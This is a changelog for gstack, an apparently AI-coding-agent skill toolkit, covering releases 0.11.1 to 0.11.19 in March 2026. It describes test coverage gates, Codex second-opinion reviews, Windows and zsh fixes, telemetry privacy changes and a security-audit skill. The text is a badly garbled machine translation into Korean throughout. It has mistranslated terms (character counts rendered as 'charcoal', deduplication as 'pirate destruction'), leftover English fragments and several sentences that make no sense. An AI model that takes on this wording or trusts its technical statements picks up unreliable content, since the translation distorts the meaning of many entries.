- **gen-skill-docs 해결사.** 템플릿 생성기는 모듈 버전의 그림자를 갖는 불균형 인라인 해결자 기능을 가지고 있으며, 최근 해결자 업데이트를 놓기 위해 SKILL.md 파일을 생성했습니다.

## [0.11.19.0] - 2026-03-24

### 고정

- **자동 업그레이드 no 더 긴 휴식.** 루트 gstack 기술 설명은 Codex 1024-char 한계에서 7개의 문자였습니다. 모든 새로운 기술 추가는 그것을 더 가까이 밀었습니다. 묘사 (바운드)에서 몸 (무제한)에 기술 여정 테이블을 이동해서, 헤드룸의 615의 숯을 가진 1017에서 409의 숯으로 떨어지는.
- **Codex 리뷰는 올바른 repo에서 실행됩니다.** 멀티 워크스페이스 설정 (도체와 동일)에서 Codex는 잘못된 프로젝트 디렉토리를 선택할 수 있습니다. 모든 `codex exec`는 이제 명시적으로 git root에 `-C`를 설정합니다.

### 추가

- **900-char 조기 경고 시험.** 새로운 테스트는 어떤 Codex 기술 설명이 900 숯을 초과하는 경우에 실패하고, 구조가 끊기 전에 설명 bloat를 붙잡기.

## [0.11.18.2] - 2026-03-24

### 고정

- **Windows daemon 고정.** 검색 서버는 Windows 때문에 Bun가 배열 (`['ignore', 'ignore', 'ignore']`)로 `stdio`를, 끈 (`'ignore'`) 아닙니다 #448, #454, #458를 요구합니다.

## [0.11.18.1] - 2026-03-24

### 변경

- **질문 당 한 가지 결정. 모든 곳에.** 모든 기술이 이제는 그 자체 집중된 질문, 권고 및 옵션으로 한 번에 결정합니다. No 더 많은 벽의 텍스트 질문은 함께 번들 관련 선택이 없습니다. 이것은 이미 세 계획 검토 기술에 시행되었습니다. 이제는 23 + 기술 전체에 걸쳐 보편적 인 규칙입니다.

## [0.11.18.0] - 2026-03-24. 이들을 가진 배

`/ship`와 `/review`는 지금 실제로 그것에 대해 이야기하고 있는 품질 문을 강제합니다. 적용 감사는 실제 게이트 (만도표)가 되고, 계획 완료는 diff에 대하여 확인되고, 당신의 계획에서 검증 단계는 자동적으로 달립니다.

### 추가

- **/ship에 있는 적용 게이트를 시험하십시오.** AI- 60% 이하 소각된 적용은 단단한 정지입니다. 60-79%는 신속한 얻습니다. 80%+ 통행. 임계는 CLAUDE.md에서 `## Test Coverage`를 통해 프로젝트 당 구성할 수 있습니다.
- **/review에 있는 적용 경고.** 낮은 적용은 이제 /ship 게이트에 도달하기 전에 눈에 띄게 뜹니다. 그래서 당신은 시험을 일찍 쓸 수 있습니다.
- **계획 완료 감사.** /ship는 플랜 파일을 읽었으며, diff에 대한 각 작업 가능한 아이템, 크로스 환경 설정을 추출하고 DONE/NOT DONE/PARTIAL/CHANGED 체크리스트를 보여줍니다. 미스팅 아이템은 배송 차단제 (배출 포함)입니다.
- **Plan-aware 범위 편류 탐지.** /review의 범위 편류 체크는 지금 계획 파일을 읽습니다. TODOS.md와 PR 묘사만 아닙니다.
- **/qa-only를 통해 자동 검증.** /ship는 플랜의 검증 섹션을 읽고 테스트하기 위해 /qa-only 인라인을 실행합니다. dev 서버가 Localhost에서 실행되는 경우. No 서버, no 문제. 그것은 우아하게 건너 뛰고 있습니다.
- **공유 계획 파일 discovery.** 대화 컨버레이션은 먼저, 콘텐츠 기반 grep fallback second. 계획 완료, 계획 검토 보고서 및 검증에 의해 사용됩니다.
- **선박 미터로그.** 적용 %, 계획 완료 비율 및 검증 결과는 /retro의 JSONL를 검토하여 추세를 추적합니다.
- **/retro에서 계획 완료.** 주간 복고풍은 배송지 전 플랜 완료율을 보여줍니다.

## [0.11.17.0] - 2026-03-24. 클리너 스킬 설명 + Proactive Opt-Out

### 변경

- **기술 설명은 이제 깨끗하고 읽기 쉽습니다.** ugly "MANUAL TRIGGER ONLY" 를 제거하여 58 캐릭터를 낭비하고 Codex 통합을 위한 오류를 구축하는 모든 기술 설명에서 접두사.
- **지금 proactive 기술 제안을 선택 할 수 있습니다.** 작업 흐름 동안 기술이 제안되는지 여부를 gstack를 원하는지 궁금해할 것입니다. 수동으로 인보크 기술을 선호한다면, 아무 것도 말도 받지 않습니다. 글로벌 설정으로 저장됩니다. `gstack-config set proactive true/false`로 언제든지 마음을 바꿀 수 있습니다.

### 고정

- **텔레메틱 소스 태그 no 더 긴 충돌.** 고정 지속 감시 및 소스 필드 검증을 원격 측정 로그에 처리하므로 오류가 발생하지 않는 경우 가장자리를 처리합니다.

## [0.11.16.1] - 2026-03-24. 설치 ID 개인 정보 보호 수정

### 고정

- **설치 ID는 이제 호스트 이름 해시 대신 랜덤 UUIDs입니다.** 오래된 `SHA-256(hostname+username)` 접근은 당신의 기계 ID가 임명 ID를 compute 할 수 있던 누군가를 의미하지 않는 것을 의미합니다. 이제 `~/.gstack/installation-id`에서 저장된 무작위 UUID를 이용합니다. 어떤 public 입력에서, 파일을 삭제해서 rotatable 사용하지 마십시오.
- **RLS 검증 스크립트는 가장자리 케이스를 처리한다.** `verify-rls.sh`는 현재 예상대로 INSERT 성공을 제대로 대우합니다 (이전 클라이언트 compat를 위해 일), 손잡이 409의 충돌 및 204의 노 ops.

## [0.11.16.0] - 2026-03-24. 더 똑똑한 CI + 원격 측정 안전

### 변경

- **CI는 기본적으로 문 테스트만 실행합니다. 주기적인 테스트는 주간을 실행합니다.** 각 E2E 시험은 현재 `gate` (블록스 PRs) 또는 `periodic` (주로 cron + on-demand)로 분류됩니다. 문 시험은 기능적인 정정 및 안전 난간을 커버합니다. 정기적인 시험은 비 세세적인 여정 시험, 및 외부 서비스를 요구하는 시험 (Codex, Gemini)를 커버합니다. CI 의견은 질 벤치 마크가 아직도 달립니다.
- **Global touchfiles는 이제 알갱이입니다.** 이전으로 `gen-skill-docs.ts`는 모든 56 E2E 테스트를 트리거했습니다. 이제는 실제로 실행중인 테스트만 합니다. `llm-judge.ts`, `test-server.ts`, `worktree.ts`, Codex/Gemini 세션 러너와 동일합니다. 진정한 글로벌 목록은 3개의 파일(제너, eval-store, touchfiles.ts 자체)로 다운됩니다.
- **새로운 `test:gate` 및 `test:periodic` 스크립트**는 `test:e2e:fast`를 대체합니다. 층에 의해 시험에 `EVALS_TIER=gate` 또는 `EVALS_TIER=periodic`를 사용하십시오.
- **`GSTACK_TELEMETRY_ENDPOINT` 대신 `GSTACK_SUPABASE_URL`를 sync로 텔레메틱스를 사용합니다.** Edge 함수는 REST API 경로가 아닌 URL 기본 URL를 필요로 합니다. 이전 변수는 `config.sh`에서 제거됩니다.
- **Cursor 사전은 이제 안전합니다.** 동기화 스크립트는 광고하기 전에 가장자리 함수의 `inserted` 조사를 확인합니다. 0 이벤트가 삽입되면 커서가 붙고 다음 실행을 retries합니다.

### 고정

- **Telemetry RLS 정책이 바짝 죄.** 모든 원격 측정 테이블에 대한 행 레벨 보안 정책은 이제 anon 키를 통해 직접 액세스가 거부됩니다. 모든 읽기 및 쓰기는 스키마 체크, 이벤트 유형 허용 목록 및 필드 길이 제한으로 검증 된 가장자리 기능을 통해 이동합니다.
- **커뮤니티 대시보드는 빠르고 서버 캐스케이드입니다.** Dashboard stats는 이제 1시간 서버 측 캐싱과 함께 단일 가장자리 함수에서 여러 개의 직접 쿼리를 교체합니다.

### 기여자

- `E2E_TIERS` 매번 시험에 대해 `test/helpers/touchfiles.ts` 의 맵을 갖습니다. 무료 유효성 검사는 `E2E_TOUCHFILES` 의 동기화에 머물 수 있습니다.
- `EVALS_FAST` / `FAST_EXCLUDED_TESTS` `EVALS_TIER`의 호의에서 제거
- `allow_failure` CI matrix에서 제거 (게이트 테스트는 믿을 수 있어야 합니다)
- 새로운 `.github/workflows/evals-periodic.yml`는 정기적인 시험 월요일 6 AM UTC를 달립니다
- 새로운 마이그레이션: `supabase/migrations/002_tighten_rls.sql`
- 새로운 연기 테스트 : `supabase/verify-rls.sh` (9 체크 : 5 + 4 쓰기)
- 필드 이름 검증을 가진 `test/telemetry.test.ts` 확장
- `browse/dist/` git (arm64-only, `./setup`)에 의해 재건축된 통일된

## [0.11.15.0] - 2026-03-24. E2E 플랜 리뷰 및 Codex를 위한 테스트 적용

### 추가

- **E2E 테스트는 계획 검토 보고서가 계획의 바닥에 나타납니다.** `/plan-eng-review` 검토 보고서는 이제 종료된 테스트입니다. `## GSTACK REVIEW REPORT`를 계획 파일에 썼으면, 시험은 그것을 붙잡습니다.
- **E2E 테스트는 Codex를 각 플랜트 기술에서 제공합니다.** 4개의 새로운 경량 시험은 `/office-hours`, `/plan-ceo-review`, `/plan-design-review`, `/plan-eng-review`가 Codex 가용성을 위한 모든 체크, 사용자를 초래하고, Codex가 사용할 수 없을 때 내리는 것을 확인합니다.

### 기여자

- `test/skill-e2e-plan.test.ts`: `plan-review-report`, `codex-offered-eng-review`, `codex-offered-ceo-review`, `codex-offered-office-hours`, `codex-offered-design-review`에 있는 새로운 E2E 시험
- contactfile mappings 및 선택 카운트 assertions 업데이트
- `touchfiles` 을 CLAUDE.md 에 문서화된 글로벌 터치파일 목록으로 추가

## [0.11.14.0] - 2026-03-24. Windows 파열 수정

### 고정

- **검색 엔진은 이제 Windows에서 작동합니다.** 3개의 합성 버그는 Windows `/browse` 사용자를 막았습니다: 서버 프로세스가 CLI 종료될 때 사망했습니다 (Bun의 `unref()`는 Windows에 진정하지 않습니다), 건강 체크 결코 ran 때문에 `process.kill(pid, 0)`는 Bun에 궤란에서 끊어지고 Chromium의 모래 상자는 spaf/>를 통해서 실패했습니다 `process.kill(pid, 0)`는 Bun를 위해 Windows를, Chromium의 모래 상자가 Chromium를 위해 해결했습니다.
- **건강 체크는 모든 플랫폼에서 첫 번째 실행.** `ensureServer()`는 PID에 의하여 근거한 탐지에 떨어지기 전에 HTTP 건강 체크를 재판합니다. 모든 OS에 믿을 수 있는, 다만 Windows.
- **시작 오류는 디스크에 로그입니다.** 서버가 시작될 때 오류가 `~/.gstack/browse-startup-error.log`로 작성되어 Windows 사용자 (who는 프로세스 detachment로 인해 stderr를 잃습니다) 벌레를 벌레로 눌 수 있습니다.
- **Chromium 샌드박스는 Windows에서 사용 가능.** Chromium의 sandbox는 Bun→Node 사슬을 통해서 spawned 때 특권을 올립니다. 이제 Windows에서만 비활성화하십시오.

### 기여자

- `isServerHealthy()` 및 `browse/test/config.test.ts`의 시작 오류 로깅에 대한 새로운 테스트

## [0.11.13.0] - 2026-03-24. 워크 트리 절연 + 인프라 우아함

### 추가

- **E2E 테스트는 이제 git worktrees에서 실행됩니다.** Gemini 및 Codex 테스트 no 더 긴 당신의 작업 나무를 오염. 각 시험 스위트는 격리 된 워크 트리를 얻을, 그리고 유용한 변경 AI 에이전트는 자동으로 헝겊 조각으로 수확됩니다. 개선을 잡아 `git apply ~/.gstack-dev/harvests/<id>/gemini.patch`를 실행하십시오.
- **해적 파괴.** 테스트가 실행에 걸쳐 동일한 개선을 생산하는 경우 SHA-256 해시를 통해 감지되고 건너 뛰는 것입니다. no 중복 패치가 뛰어납니다.
- **`describeWithWorktree()` 도움자.** 모든 E2E 테스트는 이제 한 줄 래퍼로 worktree 고립으로 선택 할 수 있습니다. 실제 repo 컨텍스트 (git history, real diff)가 tmpdirs 대신 사용할 수 있는 미래 테스트.

### 변경

- **Gen-skill-docs는 이제 모듈형 리플렉서트입니다.** monolithic 1700-line 발전기는 8개의 집중한 결산기 단위 (성장, preamble, 디자인, 검토, 테스트, 실용, 일정, 코덱-helpers)로 분할됩니다. 새로운 위주관 결산기는 지금 메가기능을 편집하는 대신에 단 하나 파일입니다.
- **Eval 결과는 프로젝트스코프입니다.** 결과는 이제 `~/.gstack/projects/$SLUG/evals/` 대신 글로벌 `~/.gstack-dev/evals/`에서 살았습니다. 다 프로젝트 사용자 no는 더 긴 eval 결과를 함께 섞습니다.

### 기여자

- WorktreeManager (`lib/worktree.ts`)는 재사용 가능한 플랫폼 단위입니다. `/batch`와 같은 미래 기술은 직접 가져올 수 있습니다.
- WorktreeManager의 12개의 새로운 단위 테스트는 lifecycle, 수확, dedup 및 과실 취급을 덮습니다.
- `GLOBAL_TOUCHFILES`는 이렇게 worktree 인프라가 모든 E2E 테스트를 트리거합니다.

## [0.11.12.0] - 2026-03-24. 트리플 바이스 오토 플랜

`/autoplan` 단계는 이제 두 개의 독립적 인 두 번째 의견이 얻고 있습니다. Codex (OpenAI의 국경 모델)과 신선한 Claude 에이전트에서 하나. 세 AI 다른 각도에서 계획을보고 검토, 마지막에 각 단계 건물.

### 추가

- **각 오토플랜 단계에 듀얼 음성.** CEO 검토, 디자인 검토 및 Eng review 각각은 Codex 도전과 독립적인 Claude 에이전트을 동시에 실행합니다. 모델이 동의하고 동의하는지 보여주는 합의 테이블을 얻습니다. 최종 게이트에서 맛 결정으로 표면의 손상.
- **단계 캐스케이드.** Codex는 context (CEO 관심사는 디자인 검토, CEO+Design inform Eng)로 전 단계 발견을 얻게 됩니다. Claude subagent는 진짜 크로스 모델 검증을 위해 진정으로 독립적으로 유지합니다.
- **구조화된 합의 테이블.** CEO 단계 점수 6 전략적인 차원, 디자인은 litmus scorecard를, eng 득점 6 건축술 차원 이용합니다. CONFIRMED/DISAGREE 각각을 위해.
- **크로스 위상 종합.** 단계 4 문은 여러 단계에서 독립적으로 등장한 테마를 강조합니다. 다른 검토자가 동일한 문제를 잡을 때 높은 confidence 신호.
- **순차적 시행.** STOP 는 단계 + 전 단계 체크리스트 사이 감적을 방지합니다. 실수로 CEO/Design/Eng (각 단계는 이전에 달려 있습니다).
- **단계 전환력.** 각 단계 경계에 짧은 상태 그래서 당신은 가득 차있는 파이프라인을 기다리지 않고 진행을 추적할 수 있습니다.
- **덱스터** Codex 또는 Claude subagent가 실패할 때, 명확한 상표 (`[codex-only]`, `[subagent-only]`, `[single-reviewer mode]`)를 가진 autoplan 우아한 degrades.

## [0.11.11.0] - 2026-03-23. 커뮤니티 파 3

10 커뮤니티 PRs 합병. 버그 수정, 플랫폼 지원, 워크플로우 개선.

### 추가

- **Chrome 멀티프로필 cookie 수입.** 당신은 이제 어떤 Chrome 단면도에서 쿠키를, 다만 과태 수입할 수 있습니다. 단면도 피커는 쉬운 ID를 위한 계정 이메일을 보여줍니다. 모든 눈에 보이는 도메인의 맞은편에 배치 수입품.
- **Linux Chromium cookie 수입.** 쿠키 가져오기는 Chrome, Chromium, Brave 및 Edge를 위해 Linux에 지금 작동됩니다. GNOME Keyring (libsecret)와 headless 환경을 위한 "peanuts" fallback 둘 다 지원하십시오.
- **Chrome 세션을 찾아볼 수 있는 확장.** `BROWSE_EXTENSIONS_DIR`를 설정하여 Chrome 확장 (광고 차단제, 접근성 도구, 사용자 정의 헤더)를 검색 테스트 세션으로 로드합니다.
- **프로젝트-경쟁 gstack 설치.** `setup --local`는 gstack를 `.claude/skills/`로 전 세계 프로젝트에서 설치합니다. per-project version pinning에 유용한.
- **배포 파이프 검사.** `/office-hours`, `/plan-eng-review`, `/ship`, `/review`는 새로운 CLI 도구 또는 도서관이 build/publish 파이프라인을 가지고 있는지 확인합니다. No 더 많은 선박 artifacts nobody는 다운로드할 수 있습니다.
- **동적인 기술 발견.** 새 기술 디렉토리 no를 추가하면 하드코드 목록 편집이 필요합니다. `skill-check` 및 `gen-skill-docs`는 파일시스템에서 기술을 자동으로 발견합니다.
- **자동 트리거 가드.** Skills now include 명시된 트리거 표준을 포함해 Claude Code를 자동 피싱하여 세균성에 근거합니다. 기존의 유동적 제안 시스템은 보존됩니다.

### 고정

- **서버 시작 충돌을 찾아보십시오.** `.gstack/` 디렉토리가 존재하지 않을 때 검색 서버 잠금 취득이 실패했습니다. 다른 프로세스가 잠금을 열었습니다. 잠금 취득 전에 state 디렉토리를 생성하여 수정합니다.
- **Zsh glob 오류 기술 preamble.** 원격 측정 클린업 루프 no는 no 파일이 존재하는 경우 zsh에서 `no matches found`를 더 오래 던졌습니다.
- **`--force` 이제 실제로 업그레이드를 강제합니다.** `gstack-upgrade --force`는 snooze 파일을 삭제합니다, 그래서 당신은 snoozing 후에 즉각 격상시킬 수 있습니다.
- **Three-dot diff in /review scope drift detection.** Scope drift 분석은 이제 branch 생성 이후 제대로 표시된 상태의 기본 branch에서 축적되지 않은 변화를 보여줍니다.
- **CI 워크플로우 YAML 파싱.** 고정 할당되지 않은 멀티 라인 `run:` 파싱 YAML 파싱을 파는 사기. 추가된 actionlint CI 워크플로.

## # 커뮤니티

@osc 덕분에 @Explorer1092, @Qike-Li, @francoisaubert1, @itstimwhite, @yinanli1917-cloud이 파에 기여합니다.

## [0.11.10.0] - 2026-03-23. CI Ubicloud의 타원형

### 추가

- **E2E evals는 PR의 CI에서 현재 실행됩니다.** 12 평행 GitHub Ubicloud의 동작 주자 PR, 각 실행 하나 시험 스위트 당 회전. Docker 이미지 사전 자전거 분, 노드, Claude CLI, 그리고 deps 그래서 설정은 가까운. 결과는 통행 PR 댓글으로 게시 /fail + 비용 고장.
- **3x 빠른 eval 실행.** 모든 E2E 테스트는 `testConcurrentIfSelected`를 통해 파일 내의 동시 실행합니다. ~18min에서 ~6min에 벽 시계 하락. 가장 느린 개인적인 시험에 의해 제한해, 순차적인 합계 아닙니다.
- **Docker CI 이미지** (`Dockerfile.ci`) 사전 설치된 툴체인. Dockerfile 또는 package.json 변경 시 자동으로 다시, GHCR의 내용 해시로 캐시됨.

### 고정

- **Routing 시험은 CI에서 일합니다.** 기술이 `.claude/skills/gstack/`의 배열 대신 top-level `.claude/skills/`에 설치됩니다. 프로젝트 수준의 기술 발견은 하위 디렉토리로 재발하지 않습니다.

### 기여자

- `EVALS_CONCURRENCY=40` 최대 평행성 (현지 default는 15에 체재합니다)
- Ubicloud 런너 ~ $0.006/run (10x GitHub 표준 런너보다 저렴)
- `workflow_dispatch` 수동 재회를 위한 방아쇠

## [0.11.9.0] - 2026-03-23. Codex 기술 로드 수정

### 고정

- **Codex no 더 긴 gstack 기술을 "무효한 SKILL.md"로 주사합니다.** 기존 설치에는 Codex가 완전히 거부된 Codex가 내장된 설명 필드(>1024 chars)가 넘겨져 있었습니다. Codex가 설명하는 경우 빌드는 항상 `.agents/`를 재생하여 stale 파일을 방지하고 기존 설치에 한 번의 이동 자동 세척이 가능한 설명들을 제거합니다.
- **`package.json` 버전은 `VERSION`와 동기화되어 있습니다.**는 뒤에 6개의 사소한 버전이었습니다. 새로운 CI 시험은 미래 편류를 붙잡습니다.

### 추가

- **Codex E2E 테스트는 이제 no 기술 로드 오류를 주장합니다.** 이 수정을 프롬프트 한 정확한 "Skipped 로드 기술 (s)" 오류는 이제 회귀 테스트입니다. `stderr`는 캡처 및 검사됩니다.
- **Codex README에 있는 문제 해결 항목.** 자동 이동이 실행되기 전에 로드 오류를 명중하는 사용자의 수동 수정 지침.

### 기여자

- `test/gen-skill-docs.test.ts`는 1024년 chars 안에 모든 `.agents/` 묘사 체재를 유효합니다
- `gstack-update-check`는 과소한 Codex SKILL.md 파일을 삭제하는 1회 이동을 포함합니다
- P1 TODO 추가: Codex→Claude 반전 버디 체크 기술

## [0.11.8.0] - 2026-03-23. zsh 호환성 수정

### 고정

- **gstack 기술은 이제 오류없이 zsh에서 작동합니다.** 모든 기술 preamble은 zsh의 "no 경기 발견" 오류를 유발하는 `.pending-*` glob 패턴을 사용하여 모든 invocation (no 의 일반적인 경우가 존재)에 대한 오류를 유발합니다. zsh의 NOMATCH 동작을 완전히 피하기 위해 PR #332 #332 의 초기 보고서 및 수정에 대한 @hnshah 덕분에.

### 추가

- **zsh glob 안전에 대한 회귀 테스트.** 새로운 시험은 `.pending-*` 본 일치를 위한 벌거벗은 포탄 globs 대신 SKILL.md 파일 사용 `find`를 모든 생성한 SKILL.md 파일을 확인합니다.

## [0.11.7.0] - 2026-03-23. /review → /ship 핸즈오프 수정

### 고정

- **`/review` 이제 배 읽음 문을 만족시킵니다.** 이전, `/review` 이전 `/ship` 이전에 CLEARED"를 보여주었다. `/review`는 `/plan-eng-review`를 위해만 보았는 결과 `/ship`를 로그하지 않았기 때문에 `/review`를 보였다. 이제 `/review`는 검토 로그에 결과를 보이며, 모든 대쉬보드는 `/review` (diff-scoped)와 `/plan-eng-review` (plan-stage)을 유효 소스로 인식한다.
- **Ship abort prompt 이제 리뷰 옵션 모두 언급합니다.** Eng Review가 누락되면 `/ship`는 `/plan-eng-review`를 언급하는 대신 "run `/review` 또는 `/plan-eng-review`"를 제안합니다.

### 기여자

- @malikrohail 의 PR #338 에 기초. DRY eng 검토 당 개선: 중복 배만 결산을 만들기 대신 공유 `REVIEW_DASHBOARD` 결산자를 업데이트.
- 검토 로그 지속, 대시보드 propagation 및 abort 텍스트를 다루는 4 가지 새로운 검증 테스트.

## [0.11.6.0] - 2026-03-23. 인프라 - 첫 번째 보안 감사

### 추가

- **`/cso` v2. breaches가 실제로 일어날지 시작하십시오.** 보안 감사는 이제 애플리케이션 코드를 터치하기 전에 인프라 공격 표면 (git History, Dependency CVEs, CI/CD 파이프라인 misconfigurations, unverified webhooks, Dockerfile security)로 시작합니다. 15 단계는 secrets archaeology, 공급망, CI/CD, LLM/AI 보안, 기술 공급망, OWASP Top 10, OWASP Top 8, STRIDE 및 Active 검증을 포함합니다.
- **두 감사 모드.** `--daily`는 8/10의 신뢰 문으로 0개의 노이즈 검사를 실행합니다 (만 보고는 그것에 관하여 높게 confident 찾아내습니다). `--comprehensive`는 2/10 막대기 (투자하는 모든 것을 고려하십시오)를 가진 깊은 매달 검사합니다.
- **Active 검증** 모든 발견은 보고하기 전에 에이전트에 의해 자주적으로 확인됩니다. no 더 많은 grep-and-guess. Variant 분석: 1개의 취약점이 확인될 때, 전체 코디베이스는 동일한 본을 위해 검색됩니다.
- **동향 추적.** 찾기는 지문을 붙이고 감사 달리기에서 추적됩니다. 당신은 새로운 것을, 고쳐지는 무슨을 볼 수 있고, 무슨은 무시되었습니다.
- **Diff-scoped 감사.** `--diff` 모드는 branch 대 기본 branch에서 변경할 수 있는 감사를 배열합니다. 전 merge 보안 검사를 위해 완벽합니다.
- **3 E2E 테스트**는 식물화된 취약점 (hardcoded API 열쇠, 추적된 `.env` 파일, 불신호 webhooks, unpinned GitHub 활동, 무수한 도커파일)를 가진 **3 E2E 테스트**. 모든 확인한 합격.

### 변경

- **스캔하기 전에 스택 탐지.** v1 ran Ruby/Java/PHP/C# 각 프로젝트에서 스택을 검사하지 않고. v2는 먼저 프레임 워크를 감지하고 관련 검사를 우선 순위로 나타냅니다.
- **Proper 도구 사용.** v1는 Bash에서 원료 `grep`를 사용했습니다; v2는 truncation 없이 믿을 수 있는 결과를 위한 `Grep` 도구를 이용합니다.

## [0.11.5.2] - 2026-03-22. 외부 목소리

### 추가

- **계획 리뷰는 이제 독립적 인 두 번째 의견을 제공합니다.** 모든 리뷰 섹션이 `/plan-ceo-review` 또는 `/plan-eng-review`에 완료된 후 Codex가 설치되어 있지 않은 경우 Claude 에이전트을 다른 AI 모델 (Codex CLI, 또는 Claude 에이전트을 얻을 수 있습니다. 플랜을 읽고, 리뷰를 놓은 것을 찾을 수 있습니다. 논리적 인 간격, 무수한 가정, 타당성 위험, 현재 사용 가능한 위험.
- **Cross-model 장력 탐지.** 외부 음성이 검토 결과에 대해 동의했을 때, 불명은 자동으로 표면이되어 TODOs로 제공되므로 아무런 손실이 없습니다.
- **리뷰 Readiness Dashboard의 외부 목소리.** `/ship` 이제 CEO/Eng/Design/Adversarial의 기존 CEO/Eng/Design/Adversarial의 외부 음성이 계획에 있는지 보여줍니다.

### 변경

- **`/plan-eng-review` Codex 통합 업그레이드.** 이전의 하드코드 단계 0.5는 Claude subagent fallback, review log persistence, 대쉬보드 가시성 및 더 높은 소싱 노력 (`xhigh`)을 추가하는 풍부한 해결자로 대체됩니다.

## [0.11.5.1] - 2026-03-23. 인라인 사무실 시간

### 변경

- **No 더 많은 "open another window"를 /office-hours를 위해.** `/plan-ceo-review` 또는 `/plan-eng-review`가 `/office-hours`를 첫째로 실행할 때, 지금 동일한 대화에서 인라인으로 실행합니다. 검토는 디자인 doc이 준비되어 있는 후에 좌측 위치를 선택합니다. 당신이 건축하는 것을 아직도 파악할 때 중간 소유 탐지를 위해 동일하.
- **Handoff는 인프라를 제거했습니다.** 이전의 "다른 창으로 이동"흐름을 흘려주는 손전등 노트는 no 더 긴 쓴다. 이전 세션에서 기존 노트는 여전히 백워드 호환성을 읽는다.

## [0.11.5.0] - 2026-03-23. Bash 호환성 수정

### 고정

- **`gstack-review-read`와 `gstack-review-log` no 더 긴 충돌 아래 bash.** 이 스크립트는 `SLUG: unbound variable` 오류를 발생 `set -euo pipefail`와 같이 bash의 변수를 설정하는 데 실패한 `source <(gstack-slug)`를 사용했습니다. bash와 zsh 모두에서 올바르게 작동하는 `eval "$(gstack-slug)"`로 대체되었습니다.
- **모든 SKILL.md 템플릿 업데이트.** `source <(gstack-slug)`를 실행하기 위한 모든 템플릿은 이제 크로스 쉘 호환성을 위해 `eval "$(gstack-slug)"`를 사용합니다. 템플릿에서 SKILL.md 파일을 재생합니다.
- **회귀 시험 추가.** 새 테스트는 `eval "$(gstack-slug)"` bash 엄격한 형태에서 작동하고, `source <(.*gstack-slug`에 대하여 감시는 템플렛 또는 궤 스크립트에서 재출발합니다.

## [0.11.4.0] - 2026-03-22. Codex 사무실 시간에

### 추가

- **당신의 뇌가 이제 두 번째 의견을 가져옵니다.** `/office-hours`의 사전 도전 후 Codex 감기에 읽을 수 있습니다. 완전히 독립적 인 AI는 대화가 문제, 답변 및 건물에 대한 리뷰를 보았지 않았습니다. 그것은 당신의 아이디어가 강철로, 당신이 말하고, 도전 하나 premise를 파악하고 48 시간 프로토 타입을 제안합니다. 두 가지 다른 AI 모델은 블라인드 스팟을 다른 것들을 볼 수 없습니다.
- **디자인 문서에 Cross-Model Perspective.** 두 번째 의견을 사용할 때, 디자인 doc은 `## Cross-Model Perspective` 섹션을 자동으로 포함합니다. Codex는 말했습니다. 그래서 독립된 전망은 다운스트림 리뷰를 위해 보존됩니다.
- **새로운 설립자 신호: 소원과 예비를 방어했습니다.** Codex가 건물 중 하나에 도전하고, 당신은 (만약하지 않는), 그것 conviction의 긍정적인 신호로 추적하는 그것으로 그것을 지키.

## [0.11.3.0] - 2026-03-23. 외부 목소리 디자인

### 추가

- **모든 디자인 리뷰는 이제 두 번째 의견이 뜹니다.** `/plan-design-review`, `/design-review`, `/design-consultation`는 Codex (OpenAI)를 둘 다 파견하고, 독립적인 당신의 디자인을 평가하기 위하여 평행한에 있는 신선한 Claude 에이전트을. 그 후에 그들이 동의하고 동의하는 것을 보여주는 litmus 득점판을 가진 발견을 종합합니다. 크로스 모델 계약 = 높은 신뢰; disagreement = 조사.
- **OpenAI의 디자인 단단한 규칙은 안으로 구워졌습니다.** 7개의 단단한 거절 기준, 7개의 litmus 체크 및 OpenAI의 "Designing Delightful Frontends" 기구에서 app-UI 분류기를 위한 착륙 페이지 대. gstack의 기존 10-item AI 슬로프 blacklist와 합병. 당신의 디자인은 동일한 규칙에 대하여 평가됩니다 OpenAI는 그들의 자신의 모형을 위해 추천합니다.
- **Codex 각 PR에 있는 디자인 음성.** `/ship`와 `/review`에서 실행되는 경량 디자인 검토는 이제 frontend 파일 변화 때 Codex 디자인 체크를 포함합니다. 자동, no 선택에서 필요로 하는.
- **/office-hours 뇌하수체에 외부 목소리.** wireframe sketches 후, 방향에 커밋하기 전에 접근법에 Codex + Claude subagent 디자인 관점을 얻을 수 있습니다.
- **AI slop blacklist는 공유한 일정으로 추출했습니다.** 10개의 반대로 patterns (자유 gradients, 3-column 아이콘 격자, 중심에 두는 모든, 등)는 지금 모든 디자인 기술에 맞서 공유된 한 번 정의되고. 유지하고, 무해하게 불가능하다.

## [0.11.2.0] - 2026-03-22. Codex 그냥 작품

### 고정

- **Codex no 더 긴 쇼 "최대 길이 1024 문자" 시작에.** 기술 설명은 ~280 단어로 1,200 단어에서 압축됩니다. 제한 하에서 잘. 모든 기술에는 이제 캡을 삽입하는 테스트가 있습니다.
- **No 더 많은 중복 기술 발견.** Codex는 소스 SKILL.md 파일과 생성된 Codex 기술 둘 다를 찾아내기 위하여 이용된 Codex를 두번마다 놓습니다. 설치는 지금 자산 Codex 필요를 가진 `~/.codex/skills/gstack`에 최소 실행 시간을 창조합니다. no 근원 파일 드러내.
- **이전 직접 자동 마이그레이션을 설치합니다.** 이전에 gstack를 `~/.codex/skills/gstack`로 복제한 경우, 설정은 `~/.gstack/repos/gstack`로 이동하여 소스 체크 아웃에서 발견되지 않는 기술이 들어갑니다.
- **Sidecar 디렉토리 no 더 긴 기술로 연결.** `.agents/skills/gstack` 런타임 자산 디렉토리는 실제 기술을 따라 잘못 symlinked. 이제 건너뛰었습니다.

### 추가

- **Repo-local Codex 설치.** Clone gstack 는 repo 이며 `./setup --host codex` 을 실행합니다. 기술 체크 아웃 옆에 설치, no 글로벌 `~/.codex/` 필요. 실행 시간에 repo-local 또는 글로벌 경로 사용 여부를 자동 탐지를 생성.
- **Kiro CLI 지원.** `./setup --host kiro`는 Kiro 에이전트 플랫폼, 만회 경로 및 symlinking 주배 자산을 위한 기술을 설치합니다. `--host auto`가 설치된 경우에 `--host auto`에 의해 자동 검출하는.
- **`.agents/`는 이제 gitignored입니다.** 생성됨 Codex 기술 파일은 no 더 긴 투입됩니다. 그들은 템플렛에서 설치 시간에 창조됩니다. repo에서 생성한 산출의 14,000+ 선을 제거하십시오.

### 변경

- **`GSTACK_DIR` `SOURCE_GSTACK_DIR`/ `INSTALL_GSTACK_DIR`로 이름을 변경했습니다.** 설치 위치와 repo의 경로가 있는 선명한 설정 스크립트를 통해 설정된 **`GSTACK_DIR` `SOURCE_GSTACK_DIR`/ `INSTALL_GSTACK_DIR`로 이름을 변경했습니다.**를 설정한다.
- **CI Codex 생성이 성공** 는, 를 검사하는 대신에, 를 `.agents/` 는 no 더 긴 투입됩니다).

## [0.11.1.1] - 2026-03-22. 계획 파일 항상 검토 상태 표시

